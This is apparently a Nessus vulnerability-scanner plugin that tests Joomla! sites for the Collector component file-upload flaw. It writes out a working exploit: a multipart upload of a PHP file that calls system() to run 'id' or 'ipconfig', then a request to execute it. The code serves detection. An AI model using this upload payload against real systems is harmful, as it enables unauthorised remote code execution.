#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(64470);
  script_version("$Revision: 1.5 $");
  script_cvs_date("$Date: 2017/05/19 13:58:07 $");

  script_bugtraq_id(57464);
  script_osvdb_id(89439);
  script_xref(name:"EDB-ID", value:"24228");

  script_name(english:"Collector Component for Joomla! File Upload RCE");
  script_summary(english:"Checks whether arbitrary file uploads are possible.");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP application that is affected by a
remote code execution vulnerability.");
  script_set_attribute(attribute:"description", value:
"The Collector Component for Joomla! running on the remote web server
is affected by a remote code execution vulnerability in the
com_collector component due to improper sanitization or verification
of uploaded files before placing them in a user-accessible path. An
unauthenticated, remote attacker can exploit this issue, by uploading
and then making a direct request to a crafted file, to execute
arbitrary PHP script on the remote host, subject to the privileges of
the web server user ID.");
  # https://packetstormsecurity.com/files/119678/Joomla-Collector-Shell-Upload.html
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?4c52ed4b");
  script_set_attribute(attribute:"solution", value:
"Unknown at this time.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:U/RC:ND");
  script_set_cvss3_base_vector("CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H");
  script_set_cvss3_temporal_vector("CVSS:3.0/E:F/RL:U/RC:X");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2013/01/19");
  script_set_attribute(attribute:"plugin_publication_date", value:"2013/02/05");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:joomla:joomla\!");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_DESTRUCTIVE_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2013-2017 Tenable Network Security, Inc.");

  script_dependencies("joomla_detect.nasl");
  script_require_ports("Services/www", 80);
  script_require_keys("installed_sw/Joomla!", "www/PHP");

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("webapp_func.inc");

app = "Joomla!";
get_install_count(app_name:app, exit_if_zero:TRUE);

port = get_http_port(default:80, php:TRUE);

install = get_single_install(
  app_name : app,
  port     : port
);
dir = install['path'];
install_url =  build_url(port:port, qs:dir);

# Verify component is installed
plugin = "Collector";

# Check KB first
installed = get_kb_item("www/"+port+"/webapp_ext/"+plugin+" under "+dir);

if (!installed)
{
  checks = make_array();
  regexes = make_list();
  regexes[0] = make_list('collectorSelect');
  checks["/components/com_collector/assets/select.css"] = regexes;

  # Ensure plugin is installed
  installed = check_webapp_ext(
    checks : checks,
    dir    : dir,
    port   : port,
    ext    : plugin
  );
}
if (!installed) audit(AUDIT_WEB_APP_EXT_NOT_INST, app, install_url, plugin + " component");

# Determine which command to execute on target host
os = get_kb_item("Host/OS");
if (os && report_paranoia < 2)
{
  if ("Windows" >< os) cmd = 'ipconfig /all';
  else cmd = 'id';

  cmds = make_list(cmd);
}
else cmds = make_list('id', 'ipconfig /all');

cmd_pats = make_array();
cmd_pats['id'] = "uid=[0-9]+.*gid=[0-9]+.*";
cmd_pats['ipconfig /all'] = "Subnet Mask";

token = (SCRIPT_NAME - ".nasl") + "-" + unixtime() + ".php";
vuln = FALSE;
n = 0;

# Attempt our upload and code execution
foreach cmd (cmds)
{
  # Get path to the file uploaded for use in our reporting section
  if (cmd == 'id') upload_path = "system('pwd')";
  else upload_path = "system('dir "+ token +"')";

  # Add a digit to file name for each additional request as file overwrites
  # will not be allowed and result in an error.
  if (n > 0) token = token - ".php" + n + ".php";

  php_shell = '-----------------------------253112480323116\r\n' +
    'Content-Disposition: form-data; name="foldername"\r\n' + '\r\n' + '\r\n' +
    '-----------------------------253112480323116\r\n' +
    'Content-Disposition: form-data; name="fileupload"; filename="' + token +
    '"\r\n' +
    'Content-Type: text/plain\r\n' + '\r\n' +
    "<?php system('" +cmd+ "');" + upload_path + ";?>" + '\r\n' +
    '-----------------------------253112480323116\r\n' +
    'Content-Disposition: form-data; name="option"\r\n' +
    '\r\n' + 'com_collector\r\n' +
    '-----------------------------253112480323116\r\n' +
    'Content-Disposition: form-data; name="view"\r\n' +
    '\r\n' + 'filelist\r\n' +
    '-----------------------------253112480323116\r\n' +
    'Content-Disposition: form-data; name="tmpl"\r\n' +
    '\r\n' + 'component\r\n' +
    '-----------------------------253112480323116\r\n' +
    'Content-Disposition: form-data; name="task"\r\n' +
    '\r\n' + 'filemanager.upload\r\n' +
    '-----------------------------253112480323116\r\n' +
    'Content-Disposition: form-data; name="folder"\r\n' + '\r\n' + '\r\n' +
    '-----------------------------253112480323116--\r\n';

  #Attempt upload
  res2 = http_send_recv3(
    method    : "POST",
    item      : dir + "/index.php",
    data      : php_shell,
    add_headers:
      make_array("Content-Type",
    "multipart/form-data; boundary=---------------------------253112480323116"),
    port         : port,
    exit_on_fail : TRUE
  );
  exp_request = http_last_sent_request();

  # Try accessing the file we created
  res3 = http_send_recv3(
    method       : "GET",
    item         : dir + "/" + token,
    port         : port,
     exit_on_fail : TRUE
  );
  output = res3[2];

  if (egrep(pattern:cmd_pats[cmd], string:output))
  {
    vuln = TRUE;
    get_up_path = "" + token;

    # Extract path for reporting
    if (cmd == 'id')
    {
      line_limit = 2;
      get_path = strstr(output, "/");
      get_up_path = chomp(get_path) + "/" + token;
      output = strstr(output, "uid") - get_path;
    }
    else
    {
      line_limit = 10;
      get_path = strstr(output, "Volume in drive");
      output = strstr(output, "Windows IP") - get_path;
      get_dir = egrep(pattern:"Directory of (.+)", string:get_path);
      if(!isnull(get_dir))
         get_up_path = chomp((get_dir - " Directory of ")) + '\\' +
           (token - ".php" + "*.php");
    }
    break;
  }
  n++;
}

if (!vuln)
  audit(AUDIT_WEB_APP_EXT_NOT_AFFECTED, app, install_url, plugin +" component");

security_report_v4(
  port        : port,
  severity    : SECURITY_HOLE,
  cmd         : cmd,
  line_limit  : line_limit,
  request     : make_list(exp_request, install_url + '/' + token),
  output      : chomp(output),
  rep_extra   : '\nNote: This file has not been removed by Nessus and will need'                + ' to be' +
                '\nmanually deleted (' + get_up_path + ').'
);
exit(0);
